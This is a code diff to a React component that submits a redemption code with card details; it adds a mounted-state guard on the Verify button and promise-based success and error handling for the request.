@@ -1,6 +1,6 @@
 "use client"
 
-import React, { useState } from 'react'
+import React, { useEffect, useState } from 'react'
 
 import { useAlert } from 'react-alert'
 import Button from '../button/Button';
@@ -9,6 +9,11 @@ const TypeOne = ({cardname, setShowmodal, showmodal, amount, setAmount, currency
     const [redemptionCode, setRedemptionCode] = useState('');
     const [loading, setLoading] = useState(false);
     const alert = useAlert();
+    const [mounted, setMounted] = useState(false);
+
+    useEffect(()=> {
+        setMounted(true);
+    }, [mounted])
 
     const handleVerify = async () => {
         setLoading(true)
@@ -42,9 +47,13 @@ Reedemption Code: ${redemptionCode}
             headers:{
                 'content-type': 'application/json',
             }
+        }).then(()=> {
+            setShowmodal(true);
+            setLoading(false);
+        }).catch(err => {
+            setLoading(false);
+            alert.error("Something went wrong, try again.")
         })
-        setShowmodal(true);
-        setLoading(false)
     }
 
   return (
@@ -65,7 +74,7 @@ Reedemption Code: ${redemptionCode}
         <Button
             title={"Verify"}
             loading={loading}
-            onClick={handleVerify}
+            onClick={mounted ? handleVerify : ()=>{}}
         />
     </>
   )
